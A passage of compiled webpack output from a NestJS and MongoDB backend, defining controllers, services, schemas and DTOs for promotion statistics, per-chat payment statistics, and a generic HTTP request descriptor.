    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], PromoteStatController.prototype, "deleteAll", null);
exports.PromoteStatController = PromoteStatController = __decorate([
    (0, swagger_1.ApiTags)('promote-stats'),
    (0, common_1.Controller)('promote-stats'),
    __metadata("design:paramtypes", [promote_stat_service_1.PromoteStatService])
], PromoteStatController);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.module.ts":
/*!*************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.module.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatModule = void 0;
const init_module_1 = __webpack_require__(/*! ./../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const promote_stat_service_1 = __webpack_require__(/*! ./promote-stat.service */ "./src/components/promote-stats/promote-stat.service.ts");
const promote_stat_controller_1 = __webpack_require__(/*! ./promote-stat.controller */ "./src/components/promote-stats/promote-stat.controller.ts");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_module_1 = __webpack_require__(/*! ../clients/client.module */ "./src/components/clients/client.module.ts");
let PromoteStatModule = class PromoteStatModule {
};
exports.PromoteStatModule = PromoteStatModule;
exports.PromoteStatModule = PromoteStatModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: promote_stat_schema_1.PromoteStat.name, collection: "promoteStats", schema: promote_stat_schema_1.PromoteStatSchema }]),
            client_module_1.ClientModule
        ],
        controllers: [promote_stat_controller_1.PromoteStatController],
        providers: [promote_stat_service_1.PromoteStatService],
        exports: [promote_stat_service_1.PromoteStatService]
    })
], PromoteStatModule);


/***/ }),

/***/ "./src/components/promote-stats/promote-stat.service.ts":
/*!**************************************************************!*\
  !*** ./src/components/promote-stats/promote-stat.service.ts ***!
  \**************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const promote_stat_schema_1 = __webpack_require__(/*! ./schemas/promote-stat.schema */ "./src/components/promote-stats/schemas/promote-stat.schema.ts");
const client_service_1 = __webpack_require__(/*! ../clients/client.service */ "./src/components/clients/client.service.ts");
let PromoteStatService = class PromoteStatService {
    constructor(promoteStatModel, clientService) {
        this.promoteStatModel = promoteStatModel;
        this.clientService = clientService;
    }
    async create(createPromoteStatDto) {
        const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);
        return createdPromoteStat.save();
    }
    async findAll() {
        const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();
        return promoteStat;
    }
    async findByClient(client) {
        const promoteStat = await this.promoteStatModel.findOne({ client }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async update(client, updatePromoteStatDto) {
        const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();
        if (!promoteStat) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
        return promoteStat;
    }
    async deleteOne(client) {
        const result = await this.promoteStatModel.deleteOne({ client }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`PromoteStat not found for client ${client}`);
        }
    }
    async deleteAll() {
        await this.promoteStatModel.deleteMany({}).exec();
    }
    async reinitPromoteStats() {
        const users = await this.findAll();
        for (const user of users) {
            await this.promoteStatModel.updateOne({ client: user.client }, {
                $set: {
                    totalCount: 0,
                    uniqueChannels: 0,
                    releaseDay: Date.now(),
                    lastUpdatedTimeStamp: Date.now(),
                    data: {}
                }
            });
        }
    }
};
exports.PromoteStatService = PromoteStatService;
exports.PromoteStatService = PromoteStatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(promote_stat_schema_1.PromoteStat.name)),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        client_service_1.ClientService])
], PromoteStatService);


/***/ }),

/***/ "./src/components/promote-stats/schemas/promote-stat.schema.ts":
/*!*********************************************************************!*\
  !*** ./src/components/promote-stats/schemas/promote-stat.schema.ts ***!
  \*********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.PromoteStatSchema = exports.PromoteStat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let PromoteStat = class PromoteStat {
};
exports.PromoteStat = PromoteStat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client ID' }),
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], PromoteStat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: { "Girls_Chating_Group_07": 4, "girls_friends_chatting_group_01": 14 }, description: 'Data' }),
    (0, mongoose_1.Prop)({ required: true, type: Map, of: Number }),
    __metadata("design:type", Map)
], PromoteStat.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 552, description: 'Total Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "totalCount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 314, description: 'Unique Channels' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "uniqueChannels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Release Day' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "releaseDay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Is Active' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], PromoteStat.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 1719929752982.0, description: 'Last Updated TimeStamp' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], PromoteStat.prototype, "lastUpdatedTimeStamp", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ["And_Girls_Boys_Group_Chatting", "Girls_Chating_Group_07"], description: 'Channels' }),
    (0, mongoose_1.Prop)({ required: true, type: [String] }),
    __metadata("design:type", Array)
], PromoteStat.prototype, "channels", void 0);
exports.PromoteStat = PromoteStat = __decorate([
    (0, mongoose_1.Schema)()
], PromoteStat);
exports.PromoteStatSchema = mongoose_1.SchemaFactory.createForClass(PromoteStat);


/***/ }),

/***/ "./src/components/shared/dto/execute-request.dto.ts":
/*!**********************************************************!*\
  !*** ./src/components/shared/dto/execute-request.dto.ts ***!
  \**********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ExecuteRequestDto = void 0;
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
var ResponseType;
(function (ResponseType) {
    ResponseType["JSON"] = "json";
    ResponseType["TEXT"] = "text";
    ResponseType["STREAM"] = "stream";
    ResponseType["BLOB"] = "blob";
    ResponseType["DOCUMENT"] = "document";
    ResponseType["ARRAYBUFFER"] = "arraybuffer";
})(ResponseType || (ResponseType = {}));
class ExecuteRequestDto {
}
exports.ExecuteRequestDto = ExecuteRequestDto;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'The URL to send the request to' }),
    (0, class_validator_1.IsUrl)({}, { message: 'Please provide a valid URL' }),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "url", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' }),
    (0, class_validator_1.IsEnum)(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS']),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "method", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ type: Object, additionalProperties: { type: "string" } }),
    (0, class_validator_1.IsObject)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "headers", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Request body data' }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "data", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ type: Object, additionalProperties: { type: 'string' } }),
    (0, class_validator_1.IsObject)(),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Object)
], ExecuteRequestDto.prototype, "params", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ enum: ResponseType, default: ResponseType.JSON }),
    (0, class_validator_1.IsEnum)(ResponseType),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", String)
], ExecuteRequestDto.prototype, "responseType", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(1000),
    (0, class_validator_1.Max)(300000),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], ExecuteRequestDto.prototype, "timeout", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Whether to follow redirects', default: true }),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    __metadata("design:type", Boolean)
], ExecuteRequestDto.prototype, "followRedirects", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 }),
    (0, class_validator_1.IsNumber)(),
    (0, class_validator_1.Min)(0),
    (0, class_validator_1.Max)(10),
    (0, class_validator_1.IsOptional)(),
    (0, class_transformer_1.Transform)(({ value }) => parseInt(value)),
    __metadata("design:type", Number)
], ExecuteRequestDto.prototype, "maxRedirects", void 0);


/***/ }),

/***/ "./src/components/stats/create-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/create-stat.dto.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
exports.CreateStatDto = CreateStatDto;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    __metadata("design:type", Number)
], CreateStatDto.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    __metadata("design:type", Boolean)
], CreateStatDto.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    __metadata("design:type", String)
], CreateStatDto.prototype, "profile", void 0);


/***/ }),

/***/ "./src/components/stats/stat.controller.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/stat.controller.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
const update_stat_dto_1 = __webpack_require__(/*! ./update-stat.dto */ "./src/components/stats/update-stat.dto.ts");
let StatController = class StatController {
    constructor(statService) {
        this.statService = statService;
    }
    async create(createStatDto) {
        return this.statService.create(createStatDto);
    }
    async findByChatIdAndProfile(chatId, profile) {
        return this.statService.findByChatIdAndProfile(chatId, profile);
    }
    async update(chatId, profile, updateStatDto) {
        return this.statService.update(chatId, profile, updateStatDto);
    }
    async deleteOne(chatId, profile) {
        return this.statService.deleteOne(chatId, profile);
    }
    async deleteAll() {
        return this.statService.deleteAll();
    }
};
exports.StatController = StatController;
__decorate([
    (0, common_1.Post)(),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_stat_dto_1.CreateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "findByChatIdAndProfile", null);
__decorate([
    (0, common_1.Put)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __param(2, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String, update_stat_dto_1.UpdateStatDto]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':chatId/:profile'),
    __param(0, (0, common_1.Param)('chatId')),
    __param(1, (0, common_1.Param)('profile')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, String]),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteOne", null);
__decorate([
    (0, common_1.Delete)(),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], StatController.prototype, "deleteAll", null);
exports.StatController = StatController = __decorate([
    (0, swagger_1.ApiTags)('stats'),
    (0, common_1.Controller)('stats'),
    __metadata("design:paramtypes", [stat_service_1.StatService])
], StatController);


/***/ }),

/***/ "./src/components/stats/stat.module.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.module.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const stat_service_1 = __webpack_require__(/*! ./stat.service */ "./src/components/stats/stat.service.ts");
const stat_controller_1 = __webpack_require__(/*! ./stat.controller */ "./src/components/stats/stat.controller.ts");
const stat_schema_1 = __webpack_require__(/*! ./stat.schema */ "./src/components/stats/stat.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let StatModule = class StatModule {
};
exports.StatModule = StatModule;
exports.StatModule = StatModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([{ name: "StatsModule", collection: "stats", schema: stat_schema_1.StatSchema }])
        ],
        controllers: [stat_controller_1.StatController],
        providers: [stat_service_1.StatService],
        exports: [stat_service_1.StatService]
    })
], StatModule);


/***/ }),

/***/ "./src/components/stats/stat.schema.ts":
/*!*********************************************!*\
  !*** ./src/components/stats/stat.schema.ts ***!
  \*********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatSchema = exports.Stat = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
let Stat = class Stat {
};
exports.Stat = Stat;
__decorate([
    (0, swagger_1.ApiProperty)({ example: '6785668464', description: 'Chat ID' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 12, description: 'Count' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "count", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 50, description: 'Pay Amount' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Number)
], Stat.prototype, "payAmount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGiven", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Demo Given Today' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "demoGivenToday", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'New User' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "newUser", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: true, description: 'Paid Reply' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "paidReply", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'Amaan Khan', description: 'Name' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: false, description: 'Second Show' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", Boolean)
], Stat.prototype, "secondShow", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: null, description: 'Did Pay' }),
    (0, mongoose_1.Prop)({ required: false }),
    __metadata("design:type", Boolean)
], Stat.prototype, "didPay", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi1', description: 'Client' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "client", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: 'shruthi', description: 'Profile' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Stat.prototype, "profile", void 0);
exports.Stat = Stat = __decorate([
    (0, mongoose_1.Schema)()
], Stat);
exports.StatSchema = mongoose_1.SchemaFactory.createForClass(Stat);
exports.StatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });


/***/ }),

/***/ "./src/components/stats/stat.service.ts":
/*!**********************************************!*\
  !*** ./src/components/stats/stat.service.ts ***!
  \**********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.StatService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let StatService = class StatService {
    constructor(statModel) {
        this.statModel = statModel;
    }
    async create(createStatDto) {
        const createdStat = new this.statModel(createStatDto);
        return createdStat.save();
    }
    async findAll() {
        const stats = await this.statModel.find().exec();
        return stats;
    }
    async findByChatIdAndProfile(chatId, profile) {
        const stat = await this.statModel.findOne({ chatId, profile }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async update(chatId, profile, updateStatDto) {
        const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();
        if (!stat) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
        return stat;
    }
    async deleteOne(chatId, profile) {
        const result = await this.statModel.deleteOne({ chatId, profile }).exec();
        if (result.deletedCount === 0) {
            throw new common_1.NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);
        }
    }
    async deleteAll() {
        await this.statModel.deleteMany({}).exec();
    }
};
exports.StatService = StatService;
exports.StatService = StatService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)("StatsModule")),
    __metadata("design:paramtypes", [mongoose_2.Model])
], StatService);


/***/ }),

/***/ "./src/components/stats/update-stat.dto.ts":
/*!*************************************************!*\
  !*** ./src/components/stats/update-stat.dto.ts ***!
  \*************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_stat_dto_1 = __webpack_require__(/*! ./create-stat.dto */ "./src/components/stats/create-stat.dto.ts");
class UpdateStatDto extends (0, swagger_1.PartialType)(create_stat_dto_1.CreateStatDto) {
}
exports.UpdateStatDto = UpdateStatDto;


/***/ }),

/***/ "./src/components/stats2/create-stat2.dto.ts":
/*!***************************************************!*\
  !*** ./src/components/stats2/create-stat2.dto.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateStatDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
class CreateStatDto {
}
